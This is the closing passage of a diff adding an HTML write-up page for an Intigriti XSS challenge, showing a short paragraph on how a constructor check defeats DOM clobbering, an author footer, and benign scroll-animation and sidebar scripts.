+      <p>The <code>constructor === Object</code> check is the key. DOM elements like <code>HTMLCollection</code> have their own constructors, so a clobbered value fails immediately. A clobbered element will never satisfy this check.</p>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <p>Written by <strong><a href="https://x.com/itx_l0b0">L0bo</a></strong> &nbsp;·&nbsp; Intigriti XSS Challenge, May 2026 &nbsp;·&nbsp; Validated and accepted by <a href="https://intigriti.com" target="_blank">Intigriti</a></p>
+  </footer>
+
+</main>
+</div>
+
+<script>
+  // Fade-in on scroll
+  const io = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        e.target.classList.add('visible');
+        io.unobserve(e.target);
+      }
+    });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.fade-in').forEach(el => io.observe(el));
+
+  // Sidebar active tracking
+  const sections = document.querySelectorAll('section[id]');
+  const links = document.querySelectorAll('.sidebar a');
+  const navIo = new IntersectionObserver((entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        links.forEach(l => l.classList.remove('active'));
+        const a = document.querySelector(`.sidebar a[href="#${e.target.id}"]`);
+        if (a) a.classList.add('active');
+      }
+    });
+  }, { threshold: 0.35 });
+  sections.forEach(s => navIo.observe(s));
+</script>
+
+</body>
+</html>
